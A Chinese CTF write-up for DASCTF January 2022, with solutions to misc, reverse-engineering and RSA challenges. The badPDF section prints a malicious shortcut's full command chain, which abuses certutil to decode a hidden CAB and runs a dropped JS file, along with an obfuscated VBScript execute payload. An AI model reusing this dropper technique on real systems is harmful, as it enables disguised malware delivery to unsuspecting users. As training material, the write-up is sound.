# 2022DASCTF一月赛部分题解

阅读量 **343646**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2022-02-11 10:30:33

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t011dc970b082d62fef.jpg)

## Misc

###  badPDF

从文件类型我们可以看到这并不是一个单纯的pdf文件，而是一个lnk文件。

![](https://p1.ssl.qhimg.com/t019a6c58509f418ff0.png)

那我们直接看它的目标指向那里，从末尾看到明显是不全的（目标的最大长度只有260个字符，而命令行参数的最大长度是4096个字符）。

![](https://p3.ssl.qhimg.com/t01a2311ab29c74bbdc.png)

使用python调用vb读取一下这个lnk文件的完整参数：

    
    
    import sys
    import win32com.client 
    
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut("20200308-sitrep-48-covid-19.pdf.lnk")
    print(shortcut.Targetpath)
    print(shortcut.Arguments)
    

得到：

    
    
    C:\Windows\System32\cmd.exe
    /c copy "20200308-sitrep-48-covid-19.pdf.lnk" %tmp%\\g4ZokyumBB2gDn.tmp /y&for /r C:\\Windows\\System32\\ %i in (*ertu*.exe) do copy %i %tmp%\\msoia.exe /y&findstr.exe "TVNDRgAAAA" %tmp%\\g4ZokyumBB2gDn.tmp>%tmp%\\cSi1r0uywDNvDu.tmp&%tmp%\\msoia.exe -decode %tmp%\\cSi1r0uywDNvDu.tmp %tmp%\\oGhPGUDC03tURV.tmp&expand %tmp%\\oGhPGUDC03tURV.tmp -F:* %tmp% &wscript %tmp%\\9sOXN6Ltf0afe7.js
    

简单读一下cmd命令可以知道主要功能：

1、将当前的lnk文件复制到 **%tmp%** 目录下，且把*ertu*.exe复制到msoia.exe（后面解码会用到），然后找lnk文件中以
**“TVNDRgAAAA”** 开头的数据，并写入 **cSi1r0uywDNvDu.tmp** 文件。

    
    
    /c copy "20200308-sitrep-48-covid-19.pdf.lnk" %tmp%\\g4ZokyumBB2gDn.tmp /y&for /r C:\\Windows\\System32\\ %i in (*ertu*.exe) do copy %i %tmp%\\msoia.exe /y&findstr.exe "TVNDRgAAAA" %tmp%\\g4ZokyumBB2gDn.tmp>%tmp%\\cSi1r0uywDNvDu.tmp
    

2、使用msoia.exe对上一步写入的数据进行解码后保存到 **oGhPGUDC03tURV.tmp**
，接着执行expand命令将刚刚解码的数据进行解压缩，并全部保存到 **%tmp%** 目录下（ **EXPAND Source.cab -F:Files
Destination** ）

    
    
    %tmp%\\msoia.exe -decode %tmp%\\cSi1r0uywDNvDu.tmp %tmp%\\oGhPGUDC03tURV.tmp&expand %tmp%\\oGhPGUDC03tURV.tmp -F:* %tmp%
    

3、最后使用 **wscript** 命令执行上一步解压缩出来的的 **9sOXN6Ltf0afe7.js** 文件。

    
    
    wscript %tmp%\\9sOXN6Ltf0afe7.js
    

下面按照此lnk文件执行的cmd命令来看看释放出的文件都有些什么：  
1、首先得到关键数据并解码：

    
    
    findstr "TVNDRgAAAA" 20200308-sitrep-48-covid-19.pdf.lnk > ans
    
    
    
    import base64
    
    f = open("ans", "rb")
    data = f.read()
    p = base64.b64decode(data)
    f.close()
    f = open("ree", "wb")
    f.write(p)
    f.close()
    print("-----------")
    

2、解码得到的文件头部是：MSCF 搜索一下可知道它是.cab文件。修改后缀后解压得到：

![](https://p4.ssl.qhimg.com/t016ce2147d950bbf2d.png)

最后，从cSi1r0uywDNvDu.tmp文件中发现了运算flag的一个VBScript：

    
    
    <?xml version='1.0'?>
    <stylesheet
    xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
    xmlns:user="placeholder"
    version="1.0">
    <output method="text"/>
     <ms:script implements-prefix="user" language="VBScript">
     <![CDATA[
     rBOH7OLTCVxzkH=HrtvBsRh3gNUbe("676d60667a64333665326564333665326564333665326536653265643336656564333665327c"):execute(rBOH7OLTCVxzkH):function HrtvBsRh3gNUbe(bhhz6HalbOkrki):for rBOH7OLTCVxzkH=1 to len(bhhz6HalbOkrki)step 2:HrtvBsRh3gNUbe=HrtvBsRh3gNUbe&chr(asc(chr("&h"&mid(bhhz6HalbOkrki,rBOH7OLTCVxzkH,2)))xor 1):next:end function:
     ]]> </ms:script>
    </stylesheet>
    

其实就是把
676d60667a64333665326564333665326564333665326536653265643336656564333665327c
进行hex解码后每个字节与1异或：

    
    
    >>> ans = bytes.fromhex(s)
    >>> ans
    b'gm`fzd36e2ed36e2ed36e2e6e2ed36eed36e2|'
    >>> ans = list(ans)
    >>> flag = [ans[i]^1 for i in range(len(ans))]
    >>> flag
    [102, 108, 97, 103, 123, 101, 50, 55, 100, 51, 100, 101, 50, 55, 100, 51, 100, 101, 50, 55, 100, 51, 100, 55, 100, 51, 100, 101, 50, 55, 100, 100, 101, 50, 55, 100, 51, 125]
    >>> ''.join(map(chr, flag))
    'flag{e27d3de27d3de27d3d7d3de27dde27d3}'
    

## Reverse

###  BabyVM

去除大量重复的花指令：

    
    
    from ida_bytes import *
    
    addr = 0x411000
    while addr <= 0x41B000:
        if get_dword(addr) == 0x1750374:
            patch_dword(addr, 0x90909090)
            patch_byte(addr+4, 0x90)
            addr += 4
        addr += 1
    print("--------------")
    

整个题逻辑比较明显，简单调试下就好。

程序的运算看起来有点烦是因为运算都是8字节为单位的，每次的运算和比较都要高四字节与低字节分别运算结合得到最后的结果，而其实程序运算只涉及低四字节的，分析的时候只看低四字节运算就是，比如下面的这种，我们看第一个式子就够了。

![](https://p2.ssl.qhimg.com/t019f09beab13873f82.png)

对于我熟悉程序流程的一个很关键的点，判断的case：

    
    
    case 26:
            byte_89F6A8 = __PAIR64__(dword_89F62C[2 * (_DWORD)v63], dword_89F628[2 * (_DWORD)v63]) == v64;
            *(&byte_89F6A8 + 1) = __PAIR64__(dword_89F62C[2 * (_DWORD)v63], dword_89F628[2 * (_DWORD)v63]) < v64;
            break;
    

其中的 **__PAIR64__** 运算，是IDA一个宏定义。

    
    
    #define __PAIR__(high, low) (((unsigned long)(high)<<sizeof(high)*8) | low)
    

多观察下这个判断case可以知道输入长度，加密结果及密文对比等，这让我们进一步了解程序的情况，如下面的内存，
**dword_89F628[12]的地方为输入的加密结果** ， **dword_89F628[14]为待对比的密文数据** 。

![](https://p1.ssl.qhimg.com/t0133127bd2d020ca12.png)

先是倒着判断的输入格式是不是flag{}，接着对flag{}中的数据进行加密，一个异或和移位。

![](https://p2.ssl.qhimg.com/t01c295e128fb4e3cd6.png)

![](https://p2.ssl.qhimg.com/t0102e5590793f4c6e3.png)

密文存放地址：

![](https://p1.ssl.qhimg.com/t01aac8e3abb12ebb96.png)

解密：

    
    
    >>> enc = [0x000000000000009C, 0x00000000000001C0, 0x00000000000001D8, 0x00000000000001D4, 0x00000000000001D4, 0x00000000000001E8, 0x00000000000001C8, 0x0000000000000098, 0x00000000000001C8, 0x00000000000001C0, 0x00000000000001EC, 0x000000000000008C, 0x00000000000001D4, 0x000000000000008C, 0x00000000000001EC, 0x00000000000001EC, 0x00000000000001C0, 0x00000000000001C0, 0x00000000000001D8, 0x00000000000001D4, 0x000000000000009C, 0x00000000000001D0, 0x00000000000001D0, 0x00000000000001D0, 0x00000000000001D4, 0x00000000000001E8, 0x00000000000001D0, 0x00000000000001EC, 0x00000000000001C8, 0x00000000000001C8, 0x00000000000001E8, 0x000000000000008C]
    >>> enc
    [156, 448, 472, 468, 468, 488, 456, 152, 456, 448, 492, 140, 468, 140, 492, 492, 448, 448, 472, 468, 156, 464, 464, 464, 468, 488, 464, 492, 456, 456, 488, 140]
    >>> flag = [(enc[i]>>2)^0x42 for i in range(len(enc))]
    >>> flag
    [101, 50, 52, 55, 55, 56, 48, 100, 48, 50, 57, 97, 55, 97, 57, 57, 50, 50, 52, 55, 101, 54, 54, 54, 55, 56, 54, 57, 48, 48, 56, 97]
    >>> bytes(flag)
    b'e247780d029a7a992247e6667869008a'
    

###  EasyVM

开始根据BeingDebugged标志返回不同的值以决定触不触发异常，题目的本意就是程序在正常运行时返回2，然后触发一个除0异常进入到程序的关键函数，也是程序添加的异常处理函数。

![](https://p1.ssl.qhimg.com/t0169e4f4636a8dceb2.png)

![](https://p2.ssl.qhimg.com/t0189fd5ae307383617.png)

看到异常处理函数，先对输入进行一个多了异或的base64编码：

![](https://p5.ssl.qhimg.com/t019d0188747f86ba3e.png)

后面是很一个简单的vm，就一些不多的函数指针，直接内存断点就能轻松定位到唯一加密函数：sub_4014D0

![](https://p5.ssl.qhimg.com/t010926e2cc05bc4065.png)

输入的每个字节进行两次异或，如下：

    
    
    0^input[0]^0xee = enc[0]
    enc[0]^input[1] = enc[1]
    ...
    ...
    

简单异或解密：

    
    
    >>> import base64
    >>> enc
    [190, 54, 172, 39, 153, 79, 222, 68, 238, 95, 218, 11, 181, 23, 184, 104, 194, 78, 156, 74, 225, 67, 240, 34, 138, 59, 136, 91, 229, 84, 255, 104, 213, 103, 212, 6, 173, 11, 216, 80, 249, 88, 224, 111, 197, 74, 253, 47, 132, 54, 133, 82, 251, 115, 215, 13, 227]
    >>> flag = []
    >>> for i in range(56, 0, -1):
    ...     enc[i] ^= 0xee
    ...     enc[i] ^= enc[i-1]
    ...
    >>> enc[0] ^= 0xee
    >>> enc
    [80, 102, 116, 101, 80, 56, 127, 116, 68, 95, 107, 63, 80, 76, 65, 62, 68, 98, 60, 56, 69, 76, 93, 60, 70, 95, 93, 61, 80, 95, 69, 121, 83, 92, 93, 60, 69, 72, 61, 102, 71, 79, 86, 97, 68, 97, 89, 60, 69, 92, 93, 57, 71, 102, 74, 52, 0]
    >>> bytes(enc)
    b'PfteP8\x7ftD_k?PLA>Db<8EL]<F_]=P_EyS\\]<EH=fGOVaDaY<E\\]9GfJ4\x00'
    for i in range(0, 56, 4):
    ...     enc[i] ^= 0xa
    ...     enc[i+1] ^= 0xb
    ...     enc[i+2] ^= 0xc
    ...     enc[i+3] ^= 0xd
    ...
    >>>
    >>> enc
    [90, 109, 120, 104, 90, 51, 115, 121, 78, 84, 103, 50, 90, 71, 77, 51, 78, 105, 48, 53, 79, 71, 81, 49, 76, 84, 81, 48, 90, 84, 73, 116, 89, 87, 81, 49, 79, 67, 49, 107, 77, 68, 90, 108, 78, 106, 85, 49, 79, 87, 81, 52, 77, 109, 70, 57, 0]
    >>> bytes(enc)
    b'ZmxhZ3syNTg2ZGM3Ni05OGQ1LTQ0ZTItYWQ1OC1kMDZlNjU1OWQ4MmF9\x00'
    >>> base64.b64decode(b"ZmxhZ3syNTg2ZGM3Ni05OGQ1LTQ0ZTItYWQ1OC1kMDZlNjU1OWQ4MmF9")
    b'flag{2586dc76-98d5-44e2-ad58-d06e6559d82a}'
    

###  babyre

首先去除几种花指令。

第一种：

![](https://p2.ssl.qhimg.com/t01e91ef68fff7e1c94.png)

第二种：

![](https://p5.ssl.qhimg.com/t01ee1b471856f04c61.png)

第三种：

![](https://p0.ssl.qhimg.com/t01384a4e390b06f46a.png)

然后看到是进行了控制流平坦化混淆，但此程序代码量不多，也就相当于没加了。

![](https://p5.ssl.qhimg.com/t01063e1edfff84df66.png)

其次程序中涉及的两个运算，整理一下：

    
    
    ~a&b|~b&a
    (a&0xf4|~a&0xF0C4020B)^(b&0xf4|~b&0xb)
    

其实两个都是异或运算，自己化简和拿数据测试一下。

    
    
    >>> a = 47
    >>> b = 69
    >>> a^b
    106
    >>> ~a&b|~b&a
    106
    >>> c = (a&0xf4|~a&0xF0C4020B)^(b&0xf4|~b&0xb)
    >>> c&0xff
    106
    >>>
    

最后加密就是一些异或和换表base64，如下面的base64

![](https://p4.ssl.qhimg.com/t01f436eb88ef832eab.png)

解密：

    
    
    table = "QVEJAfHmUYjBac+u8Ph5n9Od16FrICL/X0GvtM4qk7T2z3wNSsyoebilxWKgZpRD"
    enc = "Fi9X/fxX6Q6JBfUfBM1V/y6V6PcPjMaQLl9IuttFuH68"
    
    if '=' in enc:
        enc = enc.replace("=", '')
    tmp = [table.index(i) for i in enc]
    print("index = ", tmp)
    tmp1 = ''
    for i in tmp:
        tmp1 += bin(i)[2:].rjust(6, '0')
    res = []
    for i in range(0, len(tmp1), 8):
        res += [int(tmp1[i:i+8], 2)]
    
    print(res)
    print(tmp)
    
    for i in range(11):
        for j in range(i):
            res[3*i+0] ^= tmp[4*j+0]
            res[3*i+1] ^= tmp[4*j+1]
            res[3*i+2] ^= tmp[4*j+2]
    
    print(bytes(res))
    print(res)
    
    num = []
    key = 0
    for i in range(8):
        num += [int.from_bytes(res[4*i:4*(i+1)], "little")]
        key ^= num[i]
    key = list(key.to_bytes(4, "little"))
    print(key)
    flag = [res[i]^key[i%4] for i in range(len(res))]
    print(bytes(flag)
    #fce5e3dfc6db4f808ccaa6fcffecf583P
    

因为是填充了一个字节的，所以正确的输入就是 **fce5e3dfc6db4f808ccaa6fcffecf583**

## Crypto

###  babyrsa

    
    
    import os
    from secret import FLAG,p,q,e
    from Crypto.Util.number import bytes_to_long,long_to_bytes
    
    N = p*q
    
    def encrypt(m,N,e):
        return pow(m,e,N)
    
    def decrypt(c,N,d):
        return pow(c,d,N)
    
    def padding(msg):
        res = msg
        if len(res) < 128:
            res = res + os.urandom(128-len(res))
        return res
    
    def transfer(msg):
        assert len(msg) < 128
        m = padding(msg)
        return bytes_to_long(m)
    
    if __name__ == "__main__":
        m = transfer(FLAG)
        print(N,e)
        print(encrypt(m,N,e))
    

rsa中n可以直接查询数据库分解的模板题。[在线分解](http://factordb.com/index.php)

    
    
    import gmpy2
    from libnum import *
    
    n = 13123058934861171416713230498081453101147538789122070079961388806126697916963123413431108069961369055630747412550900239402710827847917960870358653962948282381351741121884528399369764530446509936240262290248305226552117100584726616255292963971141510518678552679033220315246377746270515853987903184512948801397452104554589803725619076066339968999308910127885089547678968793196148780382182445270838659078189316664538631875879022325427220682805580410213245364855569367702919157881367085677283124732874621569379901272662162025780608669577546548333274766058755786449491277002349918598971841605936268030140638579388226573929
    e = 2199344405076718723439776106818391416986774637417452818162477025957976213477191723664184407417234793814926418366905751689789699138123658292718951547073938244835923378103264574262319868072792187129755570696127796856136279813658923777933069924139862221947627969330450735758091555899551587605175567882253565613163972396640663959048311077691045791516671857020379334217141651855658795614761069687029140601439597978203375244243343052687488606544856116827681065414187957956049947143017305483200122033343857370223678236469887421261592930549136708160041001438350227594265714800753072939126464647703962260358930477570798420877
    enc = 1492164290534197296766878830710549288168716657792979479408332026408553210558539364503279432780006256047888761718878241924947937039103166564146378209168719163067531460700424309878383312837345239570897122826051628153030129647363574035072755426112229160684859510640271933580581310029921376842631120847546030843821787623965614564745724229763999106839802052036834811357341644073138100679508864747009014415530176077648226083725813290110828240582884113726976794751006967153951269748482024859714451264220728184903144004573228365893961477199925864862018084224563883101101842275596219857205470076943493098825250412323522013524
    p = 98197216341757567488149177586991336976901080454854408243068885480633972200382596026756300968618883148721598031574296054706280190113587145906781375704611841087782526897314537785060868780928063942914187241017272444601926795083433477673935377466676026146695321415853502288291409333200661670651818749836420808033
    q = 133639826298015917901017908376475546339925646165363264658181838203059432536492968144231040597990919971381628901127402671873954769629458944972912180415794436700950304720548263026421362847590283353425105178540468631051824814390421486132775876582962969734956410033443729557703719598998956317920674659744121941513
    
    assert p*q == n
    
    nn = (p-1)*(q-1)
    d = gmpy2.invert(e, nn)
    flag = int(pow(enc, d, n))
    print(n2s(flag))
    
    #b'hwctf{01d_Curs3_c4Me_Again}vG\x03MC\xcd\xfd\x1d\x0bO\xcaV\x9b\x87vk\xd6\xb3\xbb\x8f\xc5\xd61\xdf7\x0f\x90\xc6\x17oj]\xf5J\xd4\xa9\xcc\xdb\xbe?\xb2(\xf0\xb2\xb6\x99b\xa7e\xa8\x82\xf7SY\xc7\xd9\xde\xc4\xb5\xe3q\xc1\xe8\xfeM\xbd\xbe\xfdD\xed\xb3\x12~\x9d\xba\xa4\xb0\xfek\x81\xc4-\x82\xb3%\xae4\x7fGl\x9a\xac\xc3\x91\xc1\xbc\x04\x03o\xa4\x8d'
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Bxb0** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/267031](/post/id/267031)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __5赞

 __收藏

![](https://p4.ssl.qhimg.com/t010857340ce46bb672.jpg) Bxb0

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

